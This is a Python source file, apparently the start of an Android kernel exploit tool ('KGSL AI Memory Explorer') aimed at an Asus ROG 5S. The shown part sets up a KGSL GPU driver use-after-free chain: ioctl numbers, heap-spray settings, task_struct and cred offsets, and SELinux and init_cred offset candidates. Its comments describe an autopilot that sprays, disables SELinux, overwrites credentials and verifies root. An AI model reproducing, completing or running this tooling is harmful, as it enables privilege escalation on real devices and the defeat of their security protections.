#!/usr/bin/env python3
"""
KGSL AI Memory Explorer - ROG 5S Optimized
Live TUI with ANSI colors, background learning, Ctrl+P cancel, spray logging.
"""

import os
import sys
import time
import struct
import subprocess
import threading
import json
import select
import termios
import tty

# v4.1.25-bottom-lock: visible build tag. The
# "-bottom-lock" suffix marks the fix for the user's
# complaint that buttons and prompt were
# "disappearing for 0.001s" during TUI redraws.
# Solution: removed buttons from the TUI body
# (_render_tui_body). Buttons are now rendered ONCE
# on startup in the bottom region (rows 22+). Each
# subsequent TUI redraw only clears and rewrites
# rows 1-21 (the TUI body). The buttons and prompt
# stay put, the user can type without anything
# flickering. TUI body is also truncated to 20
# lines so it can never bleed into the bottom
# region.
_BUILD_TAG = "v4.1.25-bottom-lock"
import datetime
import fcntl
import ctypes
import re

# Portable memmem() for Python (find needle in haystack)
def memmem(haystack, haystack_len, needle, needle_len):
    if needle_len == 0 or haystack_len < needle_len:
        return None
    end = haystack_len - needle_len
    for i in range(end + 1):
        if haystack[i:i+needle_len] == needle:
            return i
    return None

# ============== TUNING CONSTANTS ==============
# Number of parallel subworkers in the learning loop. Each subworker
# forks its own spray processes and runs its own scan range slice,
# really loading the device's CPU + RAM + GPU pipeline. With N=3
# we get ~3x the spray+scan throughput vs. the old single-thread loop.
# Higher N gives more parallelism but burns more RAM (spray procs are
# ~1MB each). 3 is a good balance for a phone (e.g. ROG 5S with 12GB).
LEARN_WORKERS = 3

# ============== ANSI COLORS ==============
class C:
    RST   = "\033[0m"
    BOLD  = "\033[1m"
    DIM   = "\033[2m"
    RED   = "\033[91m"
    GRN   = "\033[92m"
    YEL   = "\033[93m"
    BLU   = "\033[94m"
    MAG   = "\033[95m"
    CYN   = "\033[96m"
    WHT   = "\033[97m"
    GRY   = "\033[90m"
    BG_BLK= "\033[40m"
    INV   = "\033[7m"
    CLR   = "\033[2J\033[H"  # clear + cursor home
    HIDE  = "\033[?25l"
    SHOW  = "\033[?25h"

# Particle animation frames (used in header / status to show liveness)
PARTICLES = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
SPRAY_PARTICLES = ["◐","◓","◑","◒"]

# ============== EXPLORER ==============
class MemoryExplorerAI:
    def __init__(self):
        self.found_items = []
        self.spray_procs = []
        self.spray_log = []  # detailed log of every spray
        self.exploit_proc = None
        self.kb_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "knowledge_base.json")
        self.log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "explorer_log.jsonl")
        self.knowledge_base = self.load_kb()

        # Live status state (updated by background threads)
        self.live = {
            "ram": 0.0,
            "status": "IDLE",
            "ai_patterns": self.knowledge_base.get("hit_count", 0),
            "last_msg": "Engine Ready.",
            "scan_offset": 0,
            "scan_total": 0,
            "spray_count": 0,
            "spray_target": 0,
            "kill_count": 0,
            "engine_pid": 0,
            "uptime_start": time.time(),
            "last_command": "—",
            "particle_idx": 0,
            "spray_pulse": 0,
            "last_spray_ts": 0.0,
            "sprays_per_sec": 0.0,
            "uid": -1,
            "user": "—",
        }
        self.root_verified = False

        # Command history (for Up/Down rewind)
        self.cmd_history = []
        self.cmd_hist_idx = 0
        self.last_cmd_text = ""

        # === v4.1: PERFORMANCE COUNTERS ===
        # Track MB/s of pages scanned, pages/sec sprayed, etc.
        # so the TUI can show real throughput, not just counts.
        self.perf = {
            "pages_scanned": 0,        # total pages sent to engine
            "bytes_read": 0,           # total bytes read from engine
            "spray_attempts": 0,       # total fork() calls
            "spray_alive_peak": 0,     # max simultaneous alive spray
            "scans_completed": 0,      # SCAN_DONE received
            "scans_failed": 0,         # SCAN_DONE with all failed
            "last_scan_throughput": 0.0,  # pages/sec last scan
            "matches_per_hour": 0.0,   # rolling matches/hour
            "matches_window_ts": [],   # last N match timestamps
        }

        # === v4.1: AI Q-LEARNING ===
        # Simple Q-learning table that picks the best spray parameters
        # (batch size, comm pattern, range offset) based on past
        # success rate. Without this, all 3 workers use the same
        # fixed parameters even when they're not working. With Q-
        # learning, workers explore different parameter combos and
        # exploit the ones that find matches.
        self.q_table = {}  # (state_key) -> {action: q_value}
        self.q_epsilon = 0.2   # exploration rate
        self.q_lr = 0.4       # learning rate (was 0.1, too slow)
        self.q_gamma = 0.9    # discount factor
        # v4.1.20: smaller batches (max 8) to stay under
        # cgroup limit. With 12 procs cap per worker and
        # 3 workers, total = 36 procs = ~216MB max.
        # Batch of 8 = at most 8 new procs per cycle, so
        # we reaper-kill the oldest 8 (replacing them) on
        # every batch. No OOM.
        self.q_actions = [
            ("batch", 4), ("batch", 6), ("batch", 8),
            ("comm", "KETO"), ("comm", "KETW"),
            ("comm", "MIXED"),
            ("range", 0), ("range", 1), ("range", 2), ("range", 3), ("range", 4),
        ]
        self.q_last_state = {}  # per-worker last state
        self.q_last_action = {} # per-worker last action

        # === v4.1: HISTOGRAM (confidence distribution) ===
        # Buckets confidence 0-100 in steps of 10 so the TUI
        # shows "where are most findings landing on confidence"
        self.conf_histogram = [0] * 11  # 0-9, 10-19, ..., 100

        # === v4.1: SPRAY v4 ALTERNATIVES ===
        # Track which spray methods work and which don't, so the
        # next batch can prefer the working ones.
        self.spray_methods_stats = {
            "popen_sleep": {"attempts": 0, "alive": 0, "matched": 0},
            "mmap_anon":   {"attempts": 0, "alive": 0, "matched": 0},
            "sendmsg":     {"attempts": 0, "alive": 0, "matched": 0},
            "setxattr":    {"attempts": 0, "alive": 0, "matched": 0},
        }

        # === v4.1: THROUGHPUT HISTORY (sparkline) ===
        # 60-element deque of pages/sec readings, one per second.
        # The TUI renders this as an ASCII sparkline so the user
        # can see if throughput is increasing, decreasing, or flat.
        self.throughput_history = [0.0] * 60
        self.throughput_idx = 0
        self._last_throughput_ts = 0.0
        self._last_pages_count = 0

        # === v4.1: KERNEL ADDRESSES (must init BEFORE load_kallsyms) ===
        # CRITICAL: these MUST be set BEFORE load_kallsyms() is
        # called below, because load_kallsyms() will write to
        # self.kernel_base / self.selinux_va / self.cred_va when
        # it finds prepare_kernel_cred / selinux_enforcing /
        # init_cred in /proc/kallsyms. If we don't initialize
        # them first, the `if pkc and not self.kernel_base` line
        # raises AttributeError and the kallsyms-derived addresses
        # are silently lost (the parse loop succeeds but the
        # auto-derive block throws and is caught by the try/except
        # in __init__). The kallsyms_summary then reports
        # "kallsyms error: ... has no attribute 'kernel_base'".
        # Bug confirmed by smoke test: kallsyms count = 2 but
        # kernel_base = None even though prepare_kernel_cred was
        # in /proc/kallsyms.
        self.kernel_base = None
        self.selinux_va  = None
        self.cred_va     = None
        self.init_task_va = None
        self.auto_mode   = True

        # === v4.1: KBASE SEARCH CACHE ===
        # If smart_kbase_finder() finds kbase, cache it here so
        # we don't keep re-scanning the kernel text region.
        self._kbase_search_active = False
        self._kbase_candidates = []  # list of (va, score, type)

        # === v4.1: AUTO CRED WALK STATE ===
        # When we find a task_struct with KETO* marker, we know
        # the KGSL UAF can read the task's cred pointer. We walk
        # cred->uid to find root. Track state per found item.
        self._cred_walk_done = set()  # set of (va, off) tuples already walked

        # === v4.1: KALLSYMS CACHE ===
        # If engine pipe is broken (pages=0, scans=0), we can
        # still get kbase / selinux / init_cred by reading
        # /proc/kallsyms directly. We parse it once and cache.
        self.kallsyms = {}  # name -> address
        self._kallsyms_loaded = False
        self._kallsyms_lock = threading.Lock()
        # v4.1: load kallsyms at startup so kernel base and
        # other symbols are available even if engine pipe is
        # broken. This makes the explorer useful even when
        # /dev/kgsl-3d0 is restricted (Termux has no kgsl).
        try:
            n_ks = self.load_kallsyms()
            # Build a one-line summary so the user knows immediately
            # whether kallsyms gave us anything useful. Without this
            # they only see the kbase=0x?????? indicator in TUI and
            # can't tell if it's because /proc/kallsyms is restricted
            # (kptr_restrict=2) or because we just couldn't find the
            # right symbols.
            ks_have = []
            if self.kernel_base:
                ks_have.append(f"kbase=0x{self.kernel_base:x}")
            if self.selinux_va:
                ks_have.append(f"selinux=0x{self.selinux_va:x}")
            if self.cred_va:
                ks_have.append(f"cred=0x{self.cred_va:x}")
            if self.init_task_va:
                ks_have.append(f"init_task=0x{self.init_task_va:x}")
            self.live["kallsyms_summary"] = (
                f"{n_ks} sym: " + ", ".join(ks_have) if ks_have
                else f"{n_ks} sym (no exploit targets)")
        except Exception as e:
            self.live["kallsyms_summary"] = f"kallsyms error: {e}"

        # v4.1: pre-test KGSL availability so the user sees the
        # error reason in TUI immediately (instead of waiting
        # for the first spray batch to fail). Also try software
        # UAF as a fallback path.
        # IMPORTANT: kgsl_fd MUST be set BEFORE _kgsl_open() is
        # called below, because _kgsl_open reads self.kgsl_fd
        # === v4.1: KGSL open (CRITICAL - device is openable!) ===
        # v4.1: read SELinux context up front so we can show
        # the user what's running and what KGSL sees.
        try:
            with open("/proc/thread-self/attr/current", "r") as _f:
                self._selinux_ctx = _f.read().strip() or "(none)"
        except Exception:
            self._selinux_ctx = "(unreadable)"
        # Read /proc/kallsyms to check kptr_restrict
        self._kptr_restricted = "?"
        try:
            with open("/proc/kallsyms") as _f:
                line = _f.readline()
                if line and line.strip() and not line.startswith("0"):
                    self._kptr_restricted = "1"  # shown as hex
                elif "Permission denied" in str(_f.read()[:100]):
                    self._kptr_restricted = "denied"
                else:
                    self._kptr_restricted = "0"
        except PermissionError:
            self._kptr_restricted = "denied"
        except Exception:
            self._kptr_restricted = "err"
        # to check if it's already open. If we don't set it
        # first, _kgsl_open throws AttributeError.
        self.kgsl_path = ""
        self.kgsl_error = ""
        self.kgsl_fd = None
        self.kgsl_objects = []
        try:
            if self._kgsl_open():
                self.live["last_msg"] = (
                    f"KGSL open OK: {self.kgsl_path}")
            else:
                # Try software-only path
                if self._try_software_uaf():
                    self.live["last_msg"] = (
                        f"KGSL off, software UAF path: {self.kgsl_error}")
                else:
                    self.live["last_msg"] = (
                        f"KGSL off: {self.kgsl_error}")
        except Exception as e:
            self.kgsl_error = str(e)
            self.live["last_msg"] = f"KGSL init error: {e}"
        # v4.1: even if init failed, try again on demand.
        # set self._kgsl_need_retry=True so render methods
        # can show "press R to retry KGSL" if needed.
        self._kgsl_retries = 0

        # === v4.1: EXPLOIT CHAIN STATE ===
        # Tracks each step of the privilege-escalation chain
        # so the user can see what step the exploit is on.
        # Steps: trigger_uaf → spray → reclaim → leak → walk_cred
        #        → overwrite → check_uid
        self.exploit_chain = {
            "step": "idle",
            "uaf_triggered": False,
            "uaf_va": 0,
            "spray_objects": 0,
            "leaked_va": 0,
            "cred_walked": False,
            "cred_uid": -1,
            "cred_gid": -1,
            "root_achieved": False,
            "shell_pid": 0,
            "step_history": [],  # list of (timestamp, step, msg)
            "ioctl_count": 0,
            "ioctl_errors": 0,
        }
        self.exploit_lock = threading.Lock()

        # === v4.1: KGSL IOCTL SPRAY (no root required) ===
        # /dev/kgsl-3d0 is 0666 (world readable/writable) on most
        # Android devices. We can use ioctl to spray GPU memory
        # without root. KGSL_IOC_GPUOBJ_ALLOC creates a GPU object
        # that lives in kernel memory. The UAF reclaim on KGSL
        # often lands in this allocator.
        #
        # CRITICAL FIX v4.1.8: do NOT re-init self.kgsl_fd here!
        # The fd was already set to a valid integer by _kgsl_open
        # (we just saw RDWR OK fd=4 in the trace). Re-initializing
        # to None overwrites the success and breaks EVERYTHING
        # downstream. The kgsl_objects list is also re-init here,
        # which is fine because it's a fresh container. But the
        # fd MUST be preserved.
        # v4.1.8: only init objects, NEVER touch kgsl_fd here.
        if not hasattr(self, "kgsl_objects") or self.kgsl_objects is None:
            self.kgsl_objects = []  # list of (gpuaddr, size)
        # KGSL ioctl numbers (from v6.c msm_kgsl.h — verified
        # against the actual kernel headers for Android 5.4 GKI).
        # _IOWR(TYPE,NUM,SIZE) = (0x80000000 | ((SIZE&0x3fff)<<16) |
        #                          ((TYPE)<<8) | (NUM))
        # KGSL_IOC_TYPE = 0x09
        # 0x13 DRAWCTXT_CREATE  = 0x40080913
        # 0x14 DRAWCTXT_DESTROY = 0x40080914
        # 0x15 MAP_USER_MEM     = 0x40080915
        # 0x16 READTIMESTAMP    = 0x40080916
        # 0x45 GPUOBJ_ALLOC     = 0x40080945
        # 0x46 GPUOBJ_FREE      = 0x40080946
        # 0x47 GPUOBJ_INFO      = 0x40080947
        # 0x4A GPU_COMMAND      = 0x4008094A
        self.KGSL_IOC_TYPE = 0x09
        self.KGSL_IOC_DRAWCTXT_CREATE  = 0x40080913
        self.KGSL_IOC_DRAWCTXT_DESTROY = 0x40080914
        self.KGSL_IOC_MAP_USER_MEM     = 0x40080915
        self.KGSL_IOC_READTIMESTAMP    = 0x40080916
        self.KGSL_IOC_GPUOBJ_ALLOC     = 0x40080945  # FIXED (was 0x2F)
        self.KGSL_IOC_GPUOBJ_FREE      = 0x40080946
        self.KGSL_IOC_GPUOBJ_INFO      = 0x40080947
        self.KGSL_IOC_GPU_COMMAND      = 0x4008094A
        # KGSL context flags
        self.KGSL_CONTEXT_PREAMBLE      = 0x00000010
        self.KGSL_CONTEXT_NO_GMEM_ALLOC = 0x00000002
        self.KGSL_MEMFLAGS_USE_CPU_MAP  = 0x10000000
        self.KGSL_CMDLIST_IB            = 0x00000001
        # PM4 opcodes (Adreno GPU command stream)
        self.CP_NOP          = 0x10
        self.CP_MEM_WRITE    = 0x3D
        self.CP_MEM_TO_MEM   = 0x73
        # GPU persistent context state (set up once, reused for
        # every GPU read/write to avoid context creation overhead).
        self.gpu_ctx_id = 0
        self.gpu_ib_id = 0
        self.gpu_ib_vma = None
        self.gpu_ib_gpu = 0
        self.gpu_dst_id = 0
        self.gpu_dst_vma = None
        self.gpu_dst_gpu = 0

        # === v4.1: REAL TASK_STRUCT OFFSETS (from v6.c, 5.4 GKI) ===
        # These are the actual offsets in the Android 5.4 Generic
        # Kernel Image. They are kernel-version-specific — wrong
        # offsets = wrong cred walk.
        self.TASK_OFFSET_PID       = 0x548  # task->pid
        self.TASK_OFFSET_TGID      = 0x550  # task->tgid
        self.TASK_OFFSET_COMM      = 0x718  # task->comm[16]
        self.TASK_OFFSET_REAL_CRED = 0x768  # task->real_cred
        self.TASK_OFFSET_CRED      = 0x770  # task->cred
        self.TASK_OFFSET_TASKS     = 0x3f0  # task->tasks (list_head)
        # CRED struct offsets (5.4 GKI)
        self.CRED_OFFSET_UID  = 0x04  # cred->uid (kuid_t)
        self.CRED_OFFSET_GID  = 0x08  # cred->gid (kgid_t)
        self.CRED_OFFSET_EUID = 0x14  # cred->euid
        self.CRED_OFFSET_EGID = 0x18  # cred->egid

        # === v4.1: REAL UAF RANGE (from v6.c) ===
        # The UAF reclaim area in v6.c starts at 0x7001FF000 with
        # size 0x10004000. Scan size 64MB (0x04000000).
        self.UAF_START_REAL     = 0x7001FF000
        self.UAF_SIZE_REAL      = 0x10004000
        self.UAF_SCAN_SIZE_REAL = 0x04000000  # 64MB
        # Selinux enforcing offsets (verified against 5.4 GKI):
        self.SELINUX_OFFSETS = [
            0x02caa000, 0x2f74ce8, 0x2f84ce8, 0x32aace8,
            0x32a9ce8, 0x2f64ce8, 0x2f54ce8, 0x30f6ce8, 0x24d90d0,
        ]
        # Kallsyms-style marker name (from v6.c)
        self.MARKER_NAME = "KETO0422"

        # === v4.1: REAL SPRAY PARAMETERS ===
        # v6.c uses SPRAY_COUNT=40000 which is HUGE — but on the
        # target device (8GB RAM Asus ROG 5S) it works because the
        # task_structs are small and dedup via slab allocator.
        self.SPRAY_COUNT_MAX  = 40000
        self.SPRAY_COUNT_STEP = 100
        self.MMAP_SPRAY_COUNT = 4000
        self.MMAP_SPRAY_STRIDE = 0x200000  # 2MB stride
        self.MMAP_SPRAY_BASE   = 0x0000000200000000

        # === v4.1: PROCESS GROUP KILL ===
        # When we spray via subprocess.Popen, we put each
        # spray in its own process group (os.setsid) so we
        # can kill the whole group at once with os.killpg.
        # This is more reliable than per-PID kill because
        # the process might fork children that survive
        # PID-only kill.
        self._last_spray_pgrp = 0

        # Render lock — shared by any code that writes to the TUI.
        # We use ONE thread (the main thread) for both reading and
        # painting, so the lock is rarely contended. It exists to
        # keep background workers (autopilot, learning) from
        # corrupting the TUI while we draw.
        self.render_lock = threading.Lock()
        self.is_reading_input = False

        # Engine I/O lock — CRITICAL. The KGSL engine has ONE stdin/stdout
        # pair, and we have TWO Python threads that want to talk to it
        # at the same time: _autopilot_worker (runs exploit/kbase/
        # selinux/cred/patch pipeline) and _learning_worker (runs
        # spray+scan). Without this lock, their bytes interleave in
        # the engine's stdin pipe AND their responses interleave in
        # the engine's stdout pipe. Result: the engine reads garbled
        # commands, hangs waiting for input that never comes, or
        # returns the wrong response to the wrong caller. The
        # engine's read loop in C is single-threaded, so Python
        # MUST serialize all engine I/O through this RLock.
        # RLock (reentrant) is used because _read_data_packet calls
        # _readline_timeout internally — nested acquisition must not
        # deadlock.
        self.engine_lock = threading.RLock()

        # Per-op busy flags (so TUI shows "EXPLOITING…" / "SCANNING…")
        self.op_busy = {"exploit": False, "scan": False}
        self.op_results = {"exploit": None, "scan": None}

        # Parallel learning state — subworker threads + shared stats lock.
        # Initialized eagerly so the cancel handler can walk them even
        # before cmd_learning_start is called.
        self._learn_subworkers = []
        self.stats_lock = threading.Lock()
        # learn_stats initialized eagerly so cmd_learning_start can
        # access fields (xattrs_set etc.) before _learning_worker runs.
        self.learn_stats = {
            "batches": 0, "matches": 0, "verified": 0,
            "false_positives": 0, "sprayed_total": 0,
            "xattrs_set": 0,
        }
        # Per-worker spray PID sets. KEY FIX: previously all 3 subworkers
        # shared one global list self.spray_procs, so when worker A hit
        # its RAM>70% threshold it would wipe worker B's and C's spray
        # procs with `self.spray_procs.clear()`. That left B and C with
        # nothing to scan and made the TUI show "1/3 workers" (only A
        # surviving its own cull cycle). Now each worker owns its own
        # set of PIDs; cross-kill is impossible.
        self.spray_procs_by_worker = {}
        # v4.1.25: flag to print the static bottom region
        # (buttons) only ONCE on startup. Subsequent TUI
        # redraws never touch the bottom region.
        self._static_bottom_printed = False
        # v4.1.20: hard cap on live spray procs per worker to
        # prevent OOM/cgroup kills. On Termux the app
        # memory cgroup has a strict limit (typically 512MB
        # on stock devices). Each spray proc uses ~4MB stack
        # + ~2MB libc, so 50+ procs = 300MB+ which trips the
        # cgroup OOM killer and kills them with SIGKILL. We
        # now keep max 12 procs per worker, rotating the
        # oldest out before spawning a new one. With 3 workers
        # that's 36 total procs = ~144MB which is well
        # within cgroup limits.
        self.MAX_SPRAY_PER_WORKER = 12
        # Adaptive scan state — when no matches are found in 5
        # consecutive batches, the scan range is shifted to try
        # a different part of the address space. Initialized here
        # so the TUI can read it even before cmd_learning_start.
        self._adaptive_scan = {
            "no_match_batches": 0,
            "offset_idx": 0,
            "ranges_tried": [],
        }

        # === SPRAY MAP / SCAN MAP ===
        # Visual 2D map of the address space. We split the 32MB
        # UAF range into 64 buckets of 512KB each and track the
        # state of each bucket:
        #   0 = unscanned, gray
        #   1 = spraying now, yellow
        #   2 = spray error, red
        #   3 = scanning now, orange
        #   4 = scan error, dark orange
        #   5 = fully done, blue/gray
        #   6 = FOUND (non-zero data), green
        # The map is rendered in the TUI as a 8x8 grid so the
        # user can see at a glance which areas we've covered.
        self.SPRAY_MAP_BUCKETS = 64  # 8x8 grid
        self.SPRAY_MAP_BUCKET_SIZE = 0x2000000 // self.SPRAY_MAP_BUCKETS
        self.spray_map = [0] * self.SPRAY_MAP_BUCKETS

        # === W3 (deep-scan worker) ===
        # Dedicated 4th worker that re-scans Empty Page locations
        # to verify they're really empty. The user reported that
        # the 3 Empty Page addresses (0xffffffc000000000 etc.) are
        # "where the spray should be" — W3 keeps poking at them
        # to see if anything new appears.
        self.w3_thread = None
        self.w3_enabled = False

        base_dir = os.path.dirname(os.path.abspath(__file__))
        self.engine_path = os.path.join(base_dir, "kgsl_engine")

        # === PRE-FLIGHT: ensure engine binary exists ===
        # If the C engine binary is missing or not ELF, compile it
        # NOW (synchronously) so the very first auto-start has a
        # working engine. Without this, the first ensure_engine()
        # call tries to Popen a missing file and silently fails
        # for several seconds while the user wonders why nothing
        # is happening.
        if not os.path.exists(self.engine_path):
            self.try_compile_engine()
        else:
            try:
                with open(self.engine_path, "rb") as _f:
                    if _f.read(4) != b"\x7fELF":
                        self.try_compile_engine()
            except Exception:
                self.try_compile_engine()

        # v4.1 (from v6.c): use real UAF range and scan size
        # v6.c uses UAF_START=0x7001FF000 + SCAN_SIZE=0x04000000
        self.uaf_start = 0x7001FF000
        self.scan_size  = 0x04000000  # 64MB (was 32MB)
        # UAF start from v6.c constant
        # if you have KGSL UAF, this is the reclaim area
        # otherwise engine falls back to kernel text scan

        # Offsets from v6.c reference (ROG 5S, kernel 5.4, AArch64)
        self.cred_offset  = 0x770            # task_struct.cred (kernel 5.4)
        self.comm_offset  = 0x718            # task_struct.comm
        self.real_cred_offset = 0x768
        # v6.c uses MARKER_OFF = 0xfd8 to be different from comm.
        # We try BOTH (comm at 0x718 AND marker at 0xfd8) so we work
        # with v6.c as well as our KETO0422 spray.
        self.marker_offsets = (0x718, 0xfd8, 0x778, 0x7c8, 0x808,
                               0x848, 0x888, 0x8c8, 0x908, 0x948,
                               0x988, 0x9c8, 0xa08, 0xa48, 0xa88,
                               0xac8, 0xb08, 0xb48, 0xb88, 0xbc8,
                               0xc08, 0xc48, 0xc88, 0xcc8, 0xd08,
                               0xd48, 0xd88, 0xdc8, 0xe08, 0xe48,
                               0xe88, 0xec8, 0xf08, 0xf48, 0xf88,
                               0xfc8, 0xfd8, 0x1018, 0x1058, 0x1098)
        # Kernel base candidates (from v6.c) + common AArch64 ranges.
        # Includes `0xffffff8cXXXX0000` (Asus/Snapdragon 888/8 Gen 1
        # builds), `0xffffffaf…` (Tensor/Exynos), `0xffffffb0…`
        # (Kirin/Huawei), `0xffffff95…` (MediaTek).
        self.kernel_base_candidates = [
            0xffffffc000000000, 0xffffffc010000000, 0xffffffc020000000,
            0xffffffc030000000, 0xffffffc035000000, 0xffffffc040000000,
            0xffffffc008200000, 0xffffffb000000000, 0xffffffa000000000,
            0xffffffaf00000000, 0xffffffaf20000000, 0xffffff9550000000,
            0xffffff94d0000000, 0xffffff8e70000000,
            # From screenshot — 0xffffff8cc1000000 (Asus ROG 5S / SD888)
            0xffffff8c00000000, 0xffffff8c10000000, 0xffffff8cc0000000,
            0xffffff8cc1000000, 0xffffff8cd0000000,
            # Tensor / Exynos (0xffffffaf…)
            0xffffffaf00000000, 0xffffffaf10000000, 0xffffffaf20000000,
            # Kirin 9000/990 (0xffffffb0…)
            0xffffffb000000000, 0xffffffb010000000, 0xffffffb020000000,
            # OnePlus/Samsung SD865
            0xffffff8c80000000, 0xffffff8d00000000,
        ]
        # Generic AArch64 kernel range — any 0xffffff8X_00000000 or
        # 0xffffff9X_00000000 is a valid candidate. We auto-discover
        # kernel base from task_struct pointers too.
        self.kbase_discovery_masks = (
            0xffffffff00000000,  # mask out low 32 bits → 1MB aligned
            0xffffffffff000000,  # mask out low 24 bits → 16MB aligned
            0xfffffffffffff000,  # mask out low 12 bits → 4KB aligned
        )
        # SELinux enforcing offsets (from v6.c candidates)
        self.selinux_offset_candidates = [
            0x02caa000, 0x2f74ce8, 0x2f84ce8, 0x32aace8, 0x3709ce8,
            0x3b3ace8, 0x3b84ce8, 0x3cf4ce8, 0x3d34ce8, 0x3d44ce8,
            0x3df4ce8, 0x3e34ce8, 0x3e54ce8, 0x3eb4ce8, 0x3f04ce8,
        ]
        # Other interesting kernel globals to try. poweroff_cmd at
        # 0x2bb8ec0 was found by the user on the SD888 kernel.
        self.interesting_offsets = {
            "selinux_enabled":  [0x02cab000, 0x2f74d00, 0x32aad00,
                                 0x2f74d08, 0x32aad08, 0x3709d08],
            "kptr_restrict":    [0x0284e000, 0x0252b000, 0x027fa000,
                                 0x2bb8ec0, 0x2bb8ec4, 0x2bb8ec8],
            "apparmor_enabled": [0x02d68000, 0x2c5b000, 0x2d37000,
                                 0x2bb8ec0],
            # poweroff_cmd is in .data, often 4-byte aligned
            "poweroff_cmd":     [0x2bb8ec0, 0x2bb8ec4, 0x2bb8ec8,
                                 0x2bb8eb0, 0x2bb8ed0],
            # commit_creds / prepare_kernel_cred — function pointers
            # (kallsyms-like). Useful for ROP / shellcode.
            "commit_creds":     [0x0b80ed0, 0x0b80ed8, 0x0b80ee0],
            "prepare_kernel_cred": [0x0b80ee8, 0x0b80ef0, 0x0b80ef8],
            # modprobe_path — 256-byte string, but anchor is the first
            # 4 bytes containing the path
            "modprobe_path":    [0x0a450c0, 0x0a450c4, 0x0a450c8],
        }
        # init_cred — primary offset from v6.c, plus alternates
        self.init_cred_offset = 0x018f9038
        self.init_cred_alternates = [
            0x018f9038, 0x018a5038, 0x01973038, 0x01939038,
            0x019f1038, 0x01a3b038, 0x01a6d038, 0x01a9f038,
        ]
        # NOTE: self.kernel_base / self.selinux_va / self.cred_va /
        # self.init_task_va / self.auto_mode are initialized at
        # the TOP of __init__ so load_kallsyms() can populate them
        # without AttributeError. Do not re-initialize here.

        # === SPRAY TECHNIQUE TOGGLE ===
        # setxattr is unreliable on Termux because of seccomp filters —
        # raw syscall(188) triggers SIGSYS and kills the process, and
        # even os.setxattr() may be blocked. Default to off so the
        # spray loop never crashes. User can enable with 'xt' command
        # once we confirm it works on their device.
        self.use_xattr_spray = False
        # xattr_warmup_done: set True after the first successful or
        # failed xattr call. Used to skip on the first iteration if
        # SIGSYS is going to kill us.
        self._xattr_warmup_done = False
        # === FULL AUTOPILOT MODE ===
        # When ON (default), the explorer starts the full pipeline on
        # launch and never stops. It will:
        #   - spray + scan + learn
        #   - when a task_struct is found → auto-find kbase, selinux, cred
        #   - auto-patch SELinux + init_cred
        #   - auto-verify root
        #   - auto-retry on any failure
        # The user can still pause with `P` and resume with `G`.
        self.autopilot_mode   = True
        self.autopilot_paused = False
        self.autopilot_thread = None
        self.watch_mode  = False   # auto-re-run exploit pipeline in background
        self.watch_thread = None

        # Cancel flag for background operations
        self.cancel_flag = threading.Event()
        self.bg_thread = None
        self.bg_lock = threading.Lock()

        # Heuristics — device-agnostic: covers Android, AOSP, Google, Samsung,
        # Huawei, Sony, Xiaomi, OnePlus, Asus and other common packages.
        self.system_apps = {
            # AOSP / Google
            "com.android.settings":     "System Settings (Developer Mode)",
            "com.android.systemui":     "System UI (Status Bar/Home)",
            "com.android.camera":       "Camera Driver Context",
            "com.android.gallery3d":    "Gallery/Media Provider",
            "com.android.deskclock":    "System Clock/Alarms",
            "com.android.contacts":     "Contacts/Phonebook",
            "com.android.phone":        "Phone/Telephony Service",
            "com.android.inputmethod":  "IME / Keyboard Service",
            "com.android.launcher":     "AOSP Launcher (Home Screen)",
            "com.android.shell":        "ADB Shell / Root Helper",
            "com.android.keyguard":     "Lock Screen Service",
            "com.android.providers.media": "Media Provider (DCIM)",
            "com.android.webview":      "System WebView (Chromium)",
            "com.google.android.gms":   "Google Play Services",
            "com.google.android.gsf":   "Google Services Framework",
            # Samsung
            "com.samsung.android.launcher":  "Samsung OneUI Launcher",
            "com.samsung.android.app.spage": "Samsung Daily Briefing",
            "com.samsung.android.sm_cn":     "Samsung SmartThings",
            "com.sec.android.app.launcher":  "Samsung Legacy Launcher",
            # Huawei / Honor
            "com.huawei.android.launcher":    "Huawei EMUI Launcher",
            "com.hihonor.android.launcher":   "Honor MagicUI Launcher",
            "com.huawei.systemui":            "Huawei SystemUI",
            # Sony
            "com.sonyericsson.home":          "Sony Xperia Home",
            "com.sonymobile.home":            "Sony Xperia Home (new)",
            # Xiaomi / Redmi / POCO
            "com.miui.home":                  "Xiaomi MIUI Launcher",
            "com.miui.systemui":              "Xiaomi SystemUI",
            # OnePlus / OPPO / Realme (ColorOS / OxygenOS)
            "com.oneplus.launcher":           "OnePlus Launcher",
            "com.oppo.launcher":              "OPPO ColorOS Launcher",
            # Asus (ROG / Zenfone)
            "com.asus.launcher":              "ASUS Launcher (ROG/Zenfone)",
            "com.asus.weathertime":           "ASUS Weather Widget",
            # Other common
            "android.uid.system":             "System UID Context (UID 1000)",
            "android.uid.phone":              "Phone UID Context",
            "u:object_r:system_app:s0":       "SELinux System App Label",
            "u:object_r:priv_app:s0":         "SELinux Privileged App Label",
        }
        # Kernel structure markers (device-agnostic — AArch64 ELF magic,
        # ARM64 prologue, common kernel strings, KGSL driver markers).
        self.kernel_structures = {
            b"KETO0422":                  "task_struct (Active Process Marker)",
            b"init_cred":                 "Kernel Root Credentials (Global)",
            b"selinux_enforcing":         "SELinux Status Bit",
            b"selinux_enabled":           "SELinux Enable Switch",
            b"kptr_restrict":             "Kernel Pointer Restriction",
            b"\x7f" + b"ELF":             "Kernel Executable Header (Base)",
            b"\xFD\x7B\xBF\xA9":          "AArch64 Function Prologue (Code)",
            b"\x00\x00\x00\x94":          "AArch64 BL/BLR Instruction",
            b"Linux version":             "Kernel Banner String",
            b"kgsl-3d0":                  "KGSL GPU Driver (target device)",
            b"mdss_fb":                   "Display Framebuffer Driver",
            b"abov_sar":                  "SAR Sensor (vendor-specific)",
            b"scsi":                      "SCSI Storage Subsystem",
            b"slub":                      "SLUB Allocator Marker",
            b"cred_jar":                  "Cred Cache (SLUB)",
            b"task_struct":               "Task Struct Type Name",
            b"kmem_cache":                "Kernel Memory Cache",
            b"modprobe_path":             "Modprobe Helper Path",
            b"core_pattern":              "Core Dump Pattern",
            b"poweroff_cmd":              "Poweroff Command Path",
        }
        self.offsets = {"pid": 0x548, "comm": 0x718, "cred": 0x770, "real_cred": 0x768, "tasks": 0x3f0}

        # Start live updater (updates live{} dict only; does NOT draw)
        self._stop_live = threading.Event()
        threading.Thread(target=self._live_updater, daemon=True).start()
        # NOTE: The render thread (_render_thread) is started later in
        # run() — it is the sole render thread. We do NOT start
        # _auto_renderer() here to avoid double-render deadlocks.

